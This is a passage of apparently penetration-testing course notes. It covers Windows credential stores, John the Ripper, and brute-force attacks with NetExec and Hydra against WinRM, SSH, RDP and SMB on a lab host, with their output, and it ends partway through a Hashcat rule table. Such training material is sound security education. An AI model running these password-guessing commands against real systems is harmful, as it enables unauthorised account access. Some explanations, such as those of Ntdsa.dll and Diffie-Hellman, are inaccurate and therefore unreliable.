<p><a href="https://en.wikipedia.org/wiki/Local_Security_Authority_Subsystem_Service">Local Security Authority Subsystem Service</a> (<code class="language-plaintext highlighter-rouge">LSASS</code>) is a collection of many modules and has access to all authentication processes that can be found in <code class="language-plaintext highlighter-rouge">%SystemRoot%\System32\Lsass.exe</code>. This service is responsible for the local system security policy, user authentication, and sending security audit logs to the <code class="language-plaintext highlighter-rouge">Event log</code>. In other words, it is the vault for Windows-based operating systems, and we can find a more detailed illustration of the LSASS architecture <a href="https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-2000-server/cc961760\(v=technet.10\)?redirectedfrom=MSDN">here</a>.</p>

<table>
  <thead>
    <tr>
      <th><strong>Authentication Packages</strong></th>
      <th><strong>Description</strong></th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">Lsasrv.dll</code></td>
      <td>The LSA Server service both enforces security policies and acts as the security package manager for the LSA. The LSA contains the Negotiate function, which selects either the NTLM or Kerberos protocol after determining which protocol is to be successful.</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">Msv1_0.dll</code></td>
      <td>Authentication package for local machine logons that don’t require custom authentication.</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">Samsrv.dll</code></td>
      <td>The Security Accounts Manager (SAM) stores local security accounts, enforces locally stored policies, and supports APIs.</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">Kerberos.dll</code></td>
      <td>Security package loaded by the LSA for Kerberos-based authentication on a machine.</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">Netlogon.dll</code></td>
      <td>Network-based logon service.</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">Ntdsa.dll</code></td>
      <td>This library is used to create new records and folders in the Windows registry.</td>
    </tr>
  </tbody>
</table>

<p>Source: <a href="https://docs.microsoft.com/en-us/windows-server/security/windows-authentication/credentials-processes-in-windows-authentication">Microsoft Docs</a>.</p>

<p>Each interactive logon session creates a separate instance of the Winlogon service. The <a href="https://docs.microsoft.com/en-us/windows/win32/secauthn/gina">Graphical Identification and Authentication</a> (<code class="language-plaintext highlighter-rouge">GINA</code>) architecture is loaded into the process area used by Winlogon, receives and processes the credentials, and invokes the authentication interfaces via the <a href="https://docs.microsoft.com/en-us/windows/win32/api/ntsecapi/nf-ntsecapi-lsalogonuser">LSALogonUser</a> function.</p>

<h6 id="sam-database">SAM Database</h6>

<p>The <a href="https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2003/cc756748\(v=ws.10\)?redirectedfrom=MSDN">Security Account Manager</a> (<code class="language-plaintext highlighter-rouge">SAM</code>) is a database file in Windows operating systems that stores users’ passwords. It can be used to authenticate local and remote users. SAM uses cryptographic measures to prevent unauthenticated users from accessing the system. User passwords are stored in a hash format in a registry structure as either an <code class="language-plaintext highlighter-rouge">LM</code> hash or an <code class="language-plaintext highlighter-rouge">NTLM</code> hash. This file is located in <code class="language-plaintext highlighter-rouge">%SystemRoot%/system32/config/SAM</code> and is mounted on HKLM/SAM. SYSTEM level permissions are required to view it.</p>

<p>Windows systems can be assigned to either a workgroup or domain during setup. If the system has been assigned to a workgroup, it handles the SAM database locally and stores all existing users locally in this database. However, if the system has been joined to a domain, the Domain Controller (<code class="language-plaintext highlighter-rouge">DC</code>) must validate the credentials from the Active Directory database (<code class="language-plaintext highlighter-rouge">ntds.dit</code>), which is stored in <code class="language-plaintext highlighter-rouge">%SystemRoot%\ntds.dit</code>.</p>

<p>Microsoft introduced a security feature in Windows NT 4.0 to help improve the security of the SAM database against offline software cracking. This is the <code class="language-plaintext highlighter-rouge">SYSKEY</code> (<code class="language-plaintext highlighter-rouge">syskey.exe</code>) feature, which, when enabled, partially encrypts the hard disk copy of the SAM file so that the password hash values for all local accounts stored in the SAM are encrypted with a key.</p>

<p><img src="https://academy.hackthebox.com/storage/modules/147/authn_credman_credprov.png" alt="Diagram of Windows logon process showing interactions between user input, Logon UI, Credential Provider, Winlogon, and Local Security Authority." /></p>

<p>Source: <a href="https://docs.microsoft.com/en-us/windows-server/security/windows-authentication/credentials-processes-in-windows-authentication">Microsoft Docs</a>.</p>

<p>Credential Manager is a feature built-in to all Windows operating systems that allows users to save the credentials they use to access various network resources and websites. Saved credentials are stored based on user profiles in each user’s <code class="language-plaintext highlighter-rouge">Credential Locker</code>. Credentials are encrypted and stored at the following location:</p>

<p>Credential Storage</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">PS</span><span class="w"> </span><span class="nx">C:\Users\</span><span class="p">[</span><span class="n">Username</span><span class="p">]</span><span class="nx">\AppData\Local\Microsoft\</span><span class="p">[</span><span class="n">Vault/Credentials</span><span class="p">]</span><span class="n">\</span><span class="w">
</span></code></pre></div></div>

<h5 id="ntds">NTDS</h5>

<p>It is very common to come across network environments where Windows systems are joined to a Windows domain. This is common because it makes it easier for admins to manage all the systems owned by their respective organizations (centralized management). In these cases, the Windows systems will send all logon requests to Domain Controllers that belong to the same Active Directory forest. Each Domain Controller hosts a file called <code class="language-plaintext highlighter-rouge">NTDS.dit</code> that is kept synchronized across all Domain Controllers with the exception of <a href="https://docs.microsoft.com/en-us/windows/win32/ad/rodc-and-active-directory-schema">Read-Only Domain Controllers</a>. NTDS.dit is a database file that stores the data in Active Directory, including but not limited to:</p>

<ul>
  <li>User accounts (username &amp; password hash)</li>
  <li>Group accounts</li>
  <li>Computer accounts</li>
  <li>Group policy objects</li>
</ul>

<p>We will practice methods that allow us to extract credentials from the NTDS.dit file later in this module.</p>

<p>Now that we have gone through a primer on credential storage concepts, let’s study the various attacks we can perform to extract credentials to further our access during assessments.</p>

<hr />

<h2 id="john-the-ripper">John The Ripper</h2>

<p><a href="https://github.com/openwall/john">John the Ripper</a> (<code class="language-plaintext highlighter-rouge">JTR</code> or <code class="language-plaintext highlighter-rouge">john</code>) is an essential pentesting tool used to check the strength of passwords and crack encrypted (or hashed) passwords using either brute force or dictionary attacks.</p>

<p>It is open-source software initially developed for UNIX-based systems and first released in 1996. It has become a staple of security professionals due to its various capabilities.</p>

<table>
  <thead>
    <tr>
      <th><strong>Encryption Technology</strong></th>
      <th><strong>Description</strong></th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">UNIX crypt(3)</code></td>
      <td>Crypt(3) is a traditional UNIX encryption system with a 56-bit key.</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">Traditional DES-based</code></td>
      <td>DES-based encryption uses the Data Encryption Standard algorithm to encrypt data.</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">bigcrypt</code></td>
      <td>Bigcrypt is an extension of traditional DES-based encryption. It uses a 128-bit key.</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">BSDI extended DES-based</code></td>
      <td>BSDI extended DES-based encryption is an extension of the traditional DES-based encryption and uses a 168-bit key.</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">FreeBSD MD5-based</code> (Linux &amp; Cisco)</td>
      <td>FreeBSD MD5-based encryption uses the MD5 algorithm to encrypt data with a 128-bit key.</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">OpenBSD Blowfish-based</code></td>
      <td>OpenBSD Blowfish-based encryption uses the Blowfish algorithm to encrypt data with a 448-bit key.</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">Kerberos/AFS</code></td>
      <td>Kerberos and AFS are authentication systems that use encryption to ensure secure entity communication.</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">Windows LM</code></td>
      <td>Windows LM encryption uses the Data Encryption Standard algorithm to encrypt data with a 56-bit key.</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">DES-based tripcodes</code></td>
      <td>DES-based tripcodes are used to authenticate users based on the Data Encryption Standard algorithm.</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">SHA-crypt hashes</code></td>
      <td>SHA-crypt hashes are used to encrypt data with a 256-bit key and are available in newer versions of Fedora and Ubuntu.</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">SHA-crypt</code> and <code class="language-plaintext highlighter-rouge">SUNMD5 hashes</code> (Solaris)</td>
      <td>SHA-crypt and SUNMD5 hashes use the SHA-crypt and MD5 algorithms to encrypt data with a 256-bit key and are available in Solaris.</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">...</code></td>
      <td>and many more.</td>
    </tr>
  </tbody>
</table>

<h4 id="attack-methods">Attack Methods</h4>

<h6 id="dictionary-attacks">Dictionary Attacks</h6>

<p>Dictionary attacks involve using a pre-generated list of words and phrases (known as a dictionary) to attempt to crack a password. This list of words and phrases is often acquired from various sources, such as publicly available dictionaries, leaked passwords, or even purchased from specialized companies. The dictionary is then used to generate a series of strings which are then used to compare against the hashed passwords. If a match is found, the password is cracked, providing an attacker access to the system and the data stored within it. This type of attack is highly effective. Therefore, it is essential to take the necessary steps to ensure that passwords are kept secure, such as using complex and unique passwords, regularly changing them, and using two-factor authentication.</p>

<h6 id="brute-force-attacks">Brute Force Attacks</h6>

<p>Brute force attacks involve attempting every conceivable combination of characters that could form a password. This is an extremely slow process, and using this method is typically only advisable if there are no other alternatives. It is also important to note that the longer and more complex the password, the more difficult it is to crack and the longer it will take to exhaust every combination. For this reason, it is highly recommended that passwords be at least 8 characters in length, with a combination of letters, numbers, and symbols.</p>

<h6 id="rainbow-table-attacks">Rainbow Table Attacks</h6>

<p>Rainbow table attacks involve using a pre-computed table of hashes and their corresponding plaintext passwords, which is a much faster method than a brute-force attack. However, this method is limited by the rainbow table size – the larger the table, the more passwords, and hashes it can store. Additionally, due to the nature of the attack, it is impossible to use rainbow tables to determine the plaintext of hashes not already included in the table. As a result, rainbow table attacks are only effective against hashes already present in the table, making the larger the table, the more successful the attack.</p>

<p>John The Ripper</p>

<p>single crack mode:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>c0derpwner@htb[/htb]<span class="nv">$ </span>john <span class="nt">--format</span><span class="o">=</span>&lt;hash_type&gt; &lt;<span class="nb">hash </span>or hash_file&gt;
</code></pre></div></div>

<p>For example, if we have a file named <code class="language-plaintext highlighter-rouge">hashes_to_crack.txt</code> that contains <code class="language-plaintext highlighter-rouge">SHA-256</code> hashes, the command to crack them would be:</p>

<p>wordlist:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>c0derpwner@htb[/htb]<span class="nv">$ </span>john <span class="nt">--wordlist</span><span class="o">=</span>&lt;wordlist_file&gt; <span class="nt">--rules</span> &lt;hash_file&gt;
</code></pre></div></div>

<h6 id="cracking-files-with-john">Cracking Files with John</h6>

<p>Additionally, we can use different modes for this with our personal wordlists and rules. We have created a list that includes many but not all tools that can be used for John:</p>

<table>
  <thead>
    <tr>
      <th><strong>Tool</strong></th>
      <th><strong>Description</strong></th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">pdf2john</code></td>
      <td>Converts PDF documents for John</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">ssh2john</code></td>
      <td>Converts SSH private keys for John</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">mscash2john</code></td>
      <td>Converts MS Cash hashes for John</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">keychain2john</code></td>
      <td>Converts OS X keychain files for John</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">rar2john</code></td>
      <td>Converts RAR archives for John</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">pfx2john</code></td>
      <td>Converts PKCS#12 files for John</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">truecrypt_volume2john</code></td>
      <td>Converts TrueCrypt volumes for John</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">keepass2john</code></td>
      <td>Converts KeePass databases for John</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">vncpcap2john</code></td>
      <td>Converts VNC PCAP files for John</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">putty2john</code></td>
      <td>Converts PuTTY private keys for John</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">zip2john</code></td>
      <td>Converts ZIP archives for John</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">hccap2john</code></td>
      <td>Converts WPA/WPA2 handshake captures for John</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">office2john</code></td>
      <td>Converts MS Office documents for John</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">wpa2john</code></td>
      <td>Converts WPA/WPA2 handshakes for John</td>
    </tr>
  </tbody>
</table>

<h6 id="winrm-1">WinRM</h6>

<p><a href="https://docs.microsoft.com/en-us/windows/win32/winrm/portal">Windows Remote Management</a> (<code class="language-plaintext highlighter-rouge">WinRM</code>) is the Microsoft implementation of the network protocol <a href="https://docs.microsoft.com/en-us/windows/win32/winrm/ws-management-protocol">Web Services Management Protocol</a> (<code class="language-plaintext highlighter-rouge">WS-Management</code>). It is a network protocol based on XML web services using the <a href="https://docs.microsoft.com/en-us/windows/win32/winrm/windows-remote-management-glossary">Simple Object Access Protocol</a> (<code class="language-plaintext highlighter-rouge">SOAP</code>) used for remote management of Windows systems. It takes care of the communication between <a href="https://en.wikipedia.org/wiki/Web-Based_Enterprise_Management">Web-Based Enterprise Management</a> (<code class="language-plaintext highlighter-rouge">WBEM</code>) and the <a href="https://docs.microsoft.com/en-us/windows/win32/wmisdk/wmi-start-page">Windows Management Instrumentation</a> (<code class="language-plaintext highlighter-rouge">WMI</code>), which can call the <a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dcom/4a893f3d-bd29-48cd-9f43-d9777a4415b0">Distributed Component Object Model</a> (<code class="language-plaintext highlighter-rouge">DCOM</code>).</p>

<p>However, for security reasons, WinRM must be activated and configured manually in Windows 10. Therefore, it depends heavily on the environment security in a domain or local network where we want to use WinRM. In most cases, one uses certificates or only specific authentication mechanisms to increase its security. WinRM uses the TCP ports <code class="language-plaintext highlighter-rouge">5985</code> (<code class="language-plaintext highlighter-rouge">HTTP</code>) and <code class="language-plaintext highlighter-rouge">5986</code> (<code class="language-plaintext highlighter-rouge">HTTPS</code>).</p>

<p>A handy tool that we can use for our password attacks is <a href="https://github.com/Pennyw0rth/NetExec">NetExec</a>, which can also be used for other protocols such as SMB, LDAP, MSSQL, and others. We recommend reading the official documentation for this tool to become familiar with it.</p>

<p>usage:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>c0derpwner@htb[/htb]<span class="nv">$ </span>nxc &lt;proto&gt; &lt;target-IP&gt; <span class="nt">-u</span> &lt;user or userlist&gt; <span class="nt">-p</span> &lt;password or passwordlist&gt;
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>c0derpwner@htb[/htb]<span class="nv">$ </span>nxc winrm 10.129.42.197 <span class="nt">-u</span> user.list <span class="nt">-p</span> password.list

WINRM       10.129.42.197   5985   NONE             <span class="o">[</span><span class="k">*</span><span class="o">]</span> None <span class="o">(</span>name:10.129.42.197<span class="o">)</span> <span class="o">(</span>domain:None<span class="o">)</span>
WINRM       10.129.42.197   5985   NONE             <span class="o">[</span><span class="k">*</span><span class="o">]</span> http://10.129.42.197:5985/wsman
WINRM       10.129.42.197   5985   NONE             <span class="o">[</span>+] None<span class="se">\u</span>ser:password <span class="o">(</span>Pwn3d!<span class="o">)</span>
</code></pre></div></div>

<p>The appearance of <code class="language-plaintext highlighter-rouge">(Pwn3d!)</code> is the sign that we can most likely execute system commands if we log in with the brute-forced user. Another handy tool that we can use to communicate with the WinRM service is <a href="https://github.com/Hackplayers/evil-winrm">Evil-WinRM</a>, which allows us to communicate with the WinRM service efficiently.</p>

<h6 id="installing-evil-winrm">Installing Evil-WinRM</h6>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>c0derpwner@htb[/htb]<span class="nv">$ </span><span class="nb">sudo </span>gem <span class="nb">install </span>evil-winrm

Fetching little-plugger-1.1.4.gem
Fetching rubyntlm-0.6.3.gem
Fetching builder-3.2.4.gem
Fetching logging-2.3.0.gem
Fetching gyoku-1.3.1.gem
Fetching nori-2.6.0.gem
Fetching gssapi-1.3.1.gem
Fetching erubi-1.10.0.gem
Fetching evil-winrm-3.3.gem
Fetching winrm-2.3.6.gem
Fetching winrm-fs-1.3.5.gem
Happy hacking! :<span class="o">)</span>
</code></pre></div></div>

<hr />
<h1 id="hydra">Hydra</h1>

<h2 id="ssh-1">SSH</h2>

<p><a href="https://www.ssh.com/academy/ssh/protocol">Secure Shell</a> (<code class="language-plaintext highlighter-rouge">SSH</code>) is a more secure way to connect to a remote host to execute system commands or transfer files from a host to a server. The SSH server runs on <code class="language-plaintext highlighter-rouge">TCP port 22</code> by default, to which we can connect using an SSH client. This service uses three different cryptography operations/methods: <code class="language-plaintext highlighter-rouge">symmetric</code> encryption, <code class="language-plaintext highlighter-rouge">asymmetric</code> encryption, and <code class="language-plaintext highlighter-rouge">hashing</code>.</p>

<h6 id="symmetric-encryption">Symmetric Encryption</h6>

<p>Symmetric encryption uses the <code class="language-plaintext highlighter-rouge">same key</code> for encryption and decryption. However, anyone who has access to the key could also access the transmitted data. Therefore, a key exchange procedure is needed for secure symmetric encryption. The <a href="https://en.wikipedia.org/wiki/Diffie%E2%80%93Hellman_key_exchange">Diffie-Hellman</a> key exchange method is used for this purpose. If a third party obtains the key, it cannot decrypt the messages because the key exchange method is unknown. However, this is used by the server and client to determine the secret key needed to access the data. Many different variants of the symmetrical cipher system can be used, such as AES, Blowfish, 3DES, etc.</p>

<h6 id="asymmetrical-encryption">Asymmetrical Encryption</h6>

<p>Asymmetric encryption uses <code class="language-plaintext highlighter-rouge">two SSH keys</code>: a private key and a public key. The private key must remain secret because only it can decrypt the messages that have been encrypted with the public key. If an attacker obtains the private key, which is often not password protected, he will be able to log in to the system without credentials. Once a connection is established, the server uses the public key for initialization and authentication. If the client can decrypt the message, it has the private key, and the SSH session can begin.</p>

<h4 id="hashing">Hashing</h4>

<p>The hashing method converts the transmitted data into another unique value. SSH uses hashing to confirm the authenticity of messages. This is a mathematical algorithm that only works in one direction.</p>

<h6 id="hydra---ssh">Hydra - SSH</h6>

<p>We can use a tool such as <code class="language-plaintext highlighter-rouge">Hydra</code> to brute force SSH. This is covered in-depth in the <a href="https://academy.hackthebox.com/course/preview/login-brute-forcing">Login Brute Forcing</a> module.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>c0derpwner@htb[/htb]<span class="nv">$ </span>hydra <span class="nt">-L</span> user.list <span class="nt">-P</span> password.list ssh://10.129.42.197

Hydra v9.1 <span class="o">(</span>c<span class="o">)</span> 2020 by van Hauser/THC &amp; David Maciejak - Please <span class="k">do </span>not use <span class="k">in </span>military or secret service organizations, or <span class="k">for </span>illegal purposes <span class="o">(</span>this is non-binding, these <span class="k">***</span> ignore laws and ethics anyway<span class="o">)</span><span class="nb">.</span>

Hydra <span class="o">(</span>https://github.com/vanhauser-thc/thc-hydra<span class="o">)</span> starting at 2022-01-10 15:03:51
<span class="o">[</span>WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use <span class="nt">-t</span> 4
<span class="o">[</span>DATA] max 16 tasks per 1 server, overall 16 tasks, 25 login tries <span class="o">(</span>l:5/p:5<span class="o">)</span>, ~2 tries per task
<span class="o">[</span>DATA] attacking ssh://10.129.42.197:22/
<span class="o">[</span>22][ssh] host: 10.129.42.197   login: user   password: password
1 of 1 target successfully completed, 1 valid password found
</code></pre></div></div>

<p>To log in to the system via the SSH protocol, we can use the OpenSSH client, which is available by default on most Linux distributions.</p>

<p>Network Services</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>c0derpwner@htb[/htb]<span class="nv">$ </span>ssh user@10.129.42.197

The authenticity of host <span class="s1">'10.129.42.197 (10.129.42.197)'</span> can<span class="s1">'t be established.
ECDSA key fingerprint is SHA256:MEuKMmfGSRuv2Hq+e90MZzhe4lHhwUEo4vWHOUSv7Us.


Are you sure you want to continue connecting (yes/no/[fingerprint])? yes

Warning: Permanently added '</span>10.129.42.197<span class="s1">' (ECDSA) to the list of known hosts.


user@10.129.42.197'</span>s password: <span class="k">********</span>

Microsoft Windows <span class="o">[</span>Version 10.0.17763.1637]
<span class="o">(</span>c<span class="o">)</span> 2018 Microsoft Corporation. All rights reserved.

user@WINSRV C:<span class="se">\U</span>sers<span class="se">\u</span>ser&gt;
</code></pre></div></div>

<hr />

<h6 id="remote-desktop-protocol-rdp">Remote Desktop Protocol (RDP)</h6>

<p>Microsoft’s <a href="https://docs.microsoft.com/en-us/troubleshoot/windows-server/remote/understanding-remote-desktop-protocol">Remote Desktop Protocol</a> (<code class="language-plaintext highlighter-rouge">RDP</code>) is a network protocol that allows remote access to Windows systems via <code class="language-plaintext highlighter-rouge">TCP port 3389</code> by default. RDP provides both users and administrators/support staff with remote access to Windows hosts within an organization. The Remote Desktop Protocol defines two participants for a connection: a so-called terminal server, on which the actual work takes place, and a terminal client, via which the terminal server is remotely controlled. In addition to the exchange of image, sound, keyboard, and pointing device, the RDP can also print documents of the terminal server on a printer connected to the terminal client or allow access to storage media available there. Technically, the RDP is an application layer protocol in the IP stack and can use TCP and UDP for data transmission. The protocol is used by various official Microsoft apps, but it is also used in some third-party solutions</p>

<h6 id="hydra---rdp">Hydra - RDP</h6>

<p>We can also use <code class="language-plaintext highlighter-rouge">Hydra</code> to perform RDP bruteforcing.</p>

<p>Network Services</p>

<div class="language-shell-session highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">c0derpwner@htb[/htb]$</span><span class="w"> </span>hydra <span class="nt">-L</span> user.list <span class="nt">-P</span> password.list rdp://10.129.42.197
<span class="go">
Hydra v9.1 (c) 2020 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-01-10 15:05:40
[WARNING] rdp servers often don't like many connections, use -t 1 or -t 4 to reduce the number of parallel connections and -W 1 or -W 3 to wait between connection to allow the server to recover
[INFO] Reduced number of tasks to 4 (rdp does not like many parallel connections)
[WARNING] the rdp module is experimental. Please test, report - and if possible, fix.
[DATA] max 4 tasks per 1 server, overall 4 tasks, 25 login tries (l:5/p:5), ~7 tries per task
[DATA] attacking rdp://10.129.42.197:3389/
[3389][rdp] account on 10.129.42.197 might be valid but account not active for remote desktop: login: mrb3n password: rockstar, continuing attacking the account.
[3389][rdp] account on 10.129.42.197 might be valid but account not active for remote desktop: login: cry0l1t3 password: delta, continuing attacking the account.
[3389][rdp] host: 10.129.42.197   login: user   password: password
1 of 1 target successfully completed, 1 valid password found
</span></code></pre></div></div>

<p>Linux offers different clients to communicate with the desired server using the RDP protocol. These include <a href="https://remmina.org/">Remmina</a>, <a href="http://www.rdesktop.org/">rdesktop</a>, <a href="https://linux.die.net/man/1/xfreerdp">xfreerdp</a>, and many others. For our purposes, we will work with xfreerdp.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>c0derpwner@htb[/htb]<span class="nv">$ </span>xfreerdp /v:&lt;target-IP&gt; /u:&lt;username&gt; /p:&lt;password&gt;
</code></pre></div></div>

<p><img src="https://academy.hackthebox.com/storage/modules/147/RDP.png" alt="Windows Control Panel displaying various settings like Administrative Tools, Device Manager, and User Accounts." /></p>

<hr />

<h4 id="hydra---smb">Hydra - SMB</h4>

<p>Network Services</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>c0derpwner@htb[/htb]<span class="nv">$ </span>hydra <span class="nt">-L</span> user.list <span class="nt">-P</span> password.list smb://10.129.42.197

Hydra v9.1 <span class="o">(</span>c<span class="o">)</span> 2020 by van Hauser/THC &amp; David Maciejak - Please <span class="k">do </span>not use <span class="k">in </span>military or secret service organizations, or <span class="k">for </span>illegal purposes <span class="o">(</span>this is non-binding, these <span class="k">***</span> ignore laws and ethics anyway<span class="o">)</span><span class="nb">.</span>

Hydra <span class="o">(</span>https://github.com/vanhauser-thc/thc-hydra<span class="o">)</span> starting at 2022-01-06 19:37:31
<span class="o">[</span>INFO] Reduced number of tasks to 1 <span class="o">(</span>smb does not like parallel connections<span class="o">)</span>
<span class="o">[</span>DATA] max 1 task per 1 server, overall 1 task, 25 login tries <span class="o">(</span>l:5236/p:4987234<span class="o">)</span>, ~25 tries per task
<span class="o">[</span>DATA] attacking smb://10.129.42.197:445/
<span class="o">[</span>445][smb] host: 10.129.42.197   login: user   password: password
1 of 1 target successfully completed, 1 valid passwords found
</code></pre></div></div>

<h6 id="smbclient">smbclient</h6>
<div class="language-shell-session highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">c0derpwner@htb[/htb]$</span><span class="w"> </span>smbclient <span class="nt">-U</span> user <span class="se">\\\\</span>10.129.42.197<span class="se">\\</span>SHARENAME
<span class="go">
Enter WORKGROUP\user's password: *******

Try "help" to get a list of possible commands.


</span><span class="gp">smb: \&gt;</span><span class="w"> </span><span class="nb">ls</span>
<span class="go">  .                                  DR        0  Thu Jan  6 18:48:47 2022
  ..                                 DR        0  Thu Jan  6 18:48:47 2022
  desktop.ini                       AHS      282  Thu Jan  6 15:44:52 2022

                10328063 blocks of size 4096. 6074274 blocks available
</span><span class="gp">smb: \&gt;</span><span class="w"> 
</span></code></pre></div></div>

<h5 id="password-mutations">Password Mutations</h5>

<hr />

<p>Many people create their passwords according to <code class="language-plaintext highlighter-rouge">simplicity instead of security</code>. To eliminate this human weakness that often compromises security measures, password policies can be created on all systems that determine how a password should look. This means that the system recognizes whether the password contains capital letters, special characters, and numbers. In addition, most password policies require a minimum length of eight characters in a password, including at least one of the above specifications.</p>

<p>In the previous sections, we guessed very simple passwords, but it becomes much more difficult to adapt this to systems that apply password policies that force the creation of more complex passwords.</p>

<p>Unfortunately, the tendency for users to create weak passwords also occurs despite the existence of password policies. Most people/employees follow the same rules when creating more complex passwords. Passwords are often created closely related to the service used. This means that many employees often select passwords that can have the company’s name in the passwords. A person’s preferences and interests also play a significant role. These can be pets, friends, sports, hobbies, and many other elements of life. <code class="language-plaintext highlighter-rouge">OSINT</code> information gathering can be very helpful for finding out more about a user’s preferences and may assist with password guessing. More information about OSINT can be found in the <a href="https://academy.hackthebox.com/course/preview/osint-corporate-recon">OSINT: Corporate Recon module</a>. Commonly, users use the following additions for their password to fit the most common password policies:</p>

<table>
  <thead>
    <tr>
      <th><strong>Description</strong></th>
      <th><strong>Password Syntax</strong></th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>First letter is uppercase.</td>
      <td><code class="language-plaintext highlighter-rouge">Password</code></td>
    </tr>
    <tr>
      <td>Adding numbers.</td>
      <td><code class="language-plaintext highlighter-rouge">Password123</code></td>
    </tr>
    <tr>
      <td>Adding year.</td>
      <td><code class="language-plaintext highlighter-rouge">Password2022</code></td>
    </tr>
    <tr>
      <td>Adding month.</td>
      <td><code class="language-plaintext highlighter-rouge">Password02</code></td>
    </tr>
    <tr>
      <td>Last character is an exclamation mark.</td>
      <td><code class="language-plaintext highlighter-rouge">Password2022!</code></td>
    </tr>
    <tr>
      <td>Adding special characters.</td>
      <td><code class="language-plaintext highlighter-rouge">P@ssw0rd2022!</code></td>
    </tr>
  </tbody>
</table>

<p>Considering that many people want to keep their passwords as simple as possible despite password policies, we can create rules for generating weak passwords. Based on statistics provided by <a href="https://wpengine.com/resources/passwords-unmasked-infographic/">WPengine</a>, most password lengths are <code class="language-plaintext highlighter-rouge">not longer</code> than <code class="language-plaintext highlighter-rouge">ten</code> characters. So what we can do is to pick specific terms that are at least <code class="language-plaintext highlighter-rouge">five</code> characters long and seem to be the most familiar to the users, such as the names of their pets, hobbies, preferences, and other interests. If the user chooses a single word (such as the current month), adds the <code class="language-plaintext highlighter-rouge">current year</code>, followed by a special character, at the end of their password, we would reach the <code class="language-plaintext highlighter-rouge">ten-character</code> password requirement. Considering that most companies require regular password changes, a user can modify their password by just changing the name of a month or a single number, etc. Let’s use a simple example to create a password list with only one entry.</p>

<h6 id="password-list">Password List</h6>

<p>Password Mutations</p>

<div class="language-shell-session highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">c0derpwner@htb[/htb]$</span><span class="w"> </span><span class="nb">cat </span>password.list
<span class="go">
password
</span></code></pre></div></div>

<p>We can use a very powerful tool called <a href="https://hashcat.net/hashcat/">Hashcat</a> to combine lists of potential names and labels with specific mutation rules to create custom wordlists. To become more familiar with Hashcat and discover the full potential of this tool, we recommend the module <a href="https://academy.hackthebox.com/course/preview/cracking-passwords-with-hashcat">Cracking Passwords with Hashcat</a>. Hashcat uses a specific syntax for defining characters and words and how they can be modified. The complete list of this syntax can be found in the official <a href="https://hashcat.net/wiki/doku.php?id=rule_based_attack">documentation</a> of Hashcat. However, the ones listed below are enough for us to understand how Hashcat mutates words.</p>

<table>
  <thead>
    <tr>
      <th><strong>Function</strong></th>
      <th><strong>Description</strong></th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">:</code></td>
      <td>Do nothing.</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">l</code></td>
      <td>Lowercase all letters.</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">u</code></td>
